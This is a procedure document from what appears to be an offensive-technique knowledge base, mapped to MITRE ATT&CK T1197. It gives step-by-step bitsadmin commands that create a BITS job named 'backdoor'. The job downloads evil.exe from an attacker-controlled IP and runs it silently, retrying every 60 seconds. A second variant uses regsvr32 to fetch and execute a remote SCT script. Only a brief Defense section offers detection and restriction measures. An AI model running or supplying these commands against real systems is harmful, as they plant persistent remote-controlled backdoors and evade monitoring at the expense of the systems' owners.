---
id: 79fc51aa-40b5-48ee-b9e6-45c815d00bed
name: Establish-Persistence-Using-BITS-Jobs-with-Backdoor-Execution
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:27.911360+00:00'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - '[[techniques/BITS Jobs|T1197 - BITS Jobs]]'
sub_techniques: []
tags:
  - '[[tags/BITS Jobs]]'
  - '[[tags/Simple User]]'
  - '[[tags/Windows - Persistence]]'
commands:
  - '[[commands/bitsadmin-create-job]]'
  - '[[commands/bitsadmin-addfile-remote]]'
  - '[[commands/bitsadmin-set-notify-cmdline]]'
  - '[[commands/bitsadmin-set-min-retry-delay]]'
  - '[[commands/bitsadmin-resume-job]]'
platforms:
  - Windows
tools:
  - '[[tools/BITSAdmin]]'
validated: true
---

# Establish-Persistence-Using-BITS-Jobs-with-Backdoor-Execution

## Summary

This procedure establishes persistence on a Windows system by creating a Background Intelligent Transfer Service (BITS) job that downloads a remote payload and executes it via a backdoor command upon completion. It leverages BITS, a legitimate Windows service for asynchronous file transfers, to blend malicious activity with normal operations, making it harder to detect. Two variants are provided: one using a local executable after download, and another using a remote script delivery via regsvr32 for added evasion.

## Description

BITS is a Windows component designed for transferring files in the background using idle bandwidth, commonly used by Windows Update and other legitimate processes. Attackers can abuse BITS jobs to download and execute malicious payloads persistently, as jobs can be configured to retry on failure and run commands post-completion. This technique requires only user-level access and works on Windows systems with BITS enabled (default on most versions). The job runs under the user's context, executes silently, and can be set to retry every 60 seconds if interrupted. Detection is challenging because BITS traffic mimics legitimate HTTP/HTTPS downloads, and many EDR tools do not monitor BITS by default. This procedure maps to MITRE ATT&CK T1197 (BITS Jobs) under Persistence and Defense Evasion tactics.

## Requirements

1. Administrative or user-level access to the target Windows machine to execute commands and create BITS jobs.
2. Network access to a controlled server hosting the payload (e.g., evil.exe or SCT file).
3. BITS service running on the target (default; verify with `sc query bits`).
4. Command-line access (e.g., via CMD or PowerShell) on the compromised machine.

## Defense

- Monitor BITS job creation and enumeration using tools like PowerShell's `Get-BitsTransfer` or Event ID 19/20 in Microsoft-Windows-Bits-Client/Operational log.
- Restrict non-admin users from creating BITS jobs via Group Policy (Computer Configuration > Administrative Templates > Network > Background Intelligent Transfer Service).
- Implement application whitelisting to block execution of downloaded files or regsvr32 invocations.
- Use EDR solutions with BITS-specific monitoring to alert on suspicious job parameters, such as unusual notify commands or remote URLs.

## Objectives

1. Create a persistent BITS job that downloads a backdoor payload from a remote server.
2. Configure the job to execute the payload silently upon download completion, establishing ongoing access.
3. Ensure the job retries on failure to maintain reliability in unstable environments.
4. Blend malicious activity with legitimate BITS usage to evade basic detection.

## Instructions

### Step 1: Create the BITS Job

**Context**: Initialize a new BITS job named 'backdoor' to serve as the container for the download and execution logic. This step sets up the job without starting it yet.

**Command** ([[commands/bitsadmin-create-job]]):
```cmd
bitsadmin /create backdoor
```

> This command creates a transient BITS job. Expected output: "BITS job 'backdoor' created successfully." If the job name already exists, it will error; delete existing jobs first with `bitsadmin /delete backdoor` if needed.

### Step 2: Add Remote File to the Job

**Context**: Specify the remote payload to download (e.g., an executable) and its local destination path. This queues the transfer without immediate execution.

**Command** ([[commands/bitsadmin-addfile-remote]]):
```cmd
bitsadmin /addfile backdoor "http://$_ATTACKER_IP/evil.exe" "C:\tmp\evil.exe"
```

> Replace $_ATTACKER_IP with your controlled server's IP. Expected output: "Added file 'http://.../evil.exe' to job 'backdoor'." The file will download to C:\tmp\evil.exe once resumed. Ensure the local path is writable.

### Step 3: Configure Notify Command for Local Execution (Variant 1)

**Context**: For the first variant, set the post-download command to execute the local payload silently. This runs the executable with NUL as stdin to suppress prompts.

**Command** ([[commands/bitsadmin-set-notify-cmdline]]):
```cmd
bitsadmin /SetNotifyCmdLine backdoor C:\tmp\evil.exe NUL
```

> Expected output: "Set notify command line for job 'backdoor' to 'C:\tmp\evil.exe NUL'." Upon completion, evil.exe executes in the background.

### Step 4: Set Retry Delay and Resume Job (Variant 1)

**Context**: Configure a 60-second minimum retry delay for resilience, then resume the job to start the download and eventual execution.

**Command** ([[commands/bitsadmin-set-min-retry-delay]]):
```cmd
bitsadmin /SetMinRetryDelay backdoor 60
```

> Expected output: "Set minimum retry delay for job 'backdoor' to 60 seconds."

**Command** ([[commands/bitsadmin-resume-job]]):
```cmd
bitsadmin /resume backdoor
```

> Expected output: "Resumed job 'backdoor'." Monitor progress with `bitsadmin /list` or `bitsadmin /info backdoor`. Success: Job state changes to 'Transferred' and notify command executes.

### Step 5: Configure Notify Command for Remote Script Delivery (Variant 2)

**Context**: For the second variant, use regsvr32 to fetch and execute a remote SCT file via WebDAV, bypassing direct executable downloads. This adds evasion by leveraging a trusted binary.

**Command** ([[commands/bitsadmin-set-notify-cmdline]]):
```cmd
bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u /i:http://$_ATTACKER_IP:8080/$_SCRIPT_NAME.sct scrobj.dll"
```

> Replace $_ATTACKER_IP and $_SCRIPT_NAME (e.g., FHXSd9) with your values; host the SCT on a WebDAV-enabled server. Expected output: "Set notify command line for job 'backdoor'..." Flags: /s (silent), /n (no UI), /u (unregister), /i (script URL).

### Step 6: Resume Job for Remote Variant

**Context**: After setting the remote notify, resume to trigger the download and regsvr32 execution.

**Command** ([[commands/bitsadmin-resume-job]]):
```cmd
bitsadmin /resume backdoor
```

> Expected output: "Resumed job 'backdoor'." The job downloads the file, then regsvr32 fetches and runs the SCT script, establishing the backdoor.
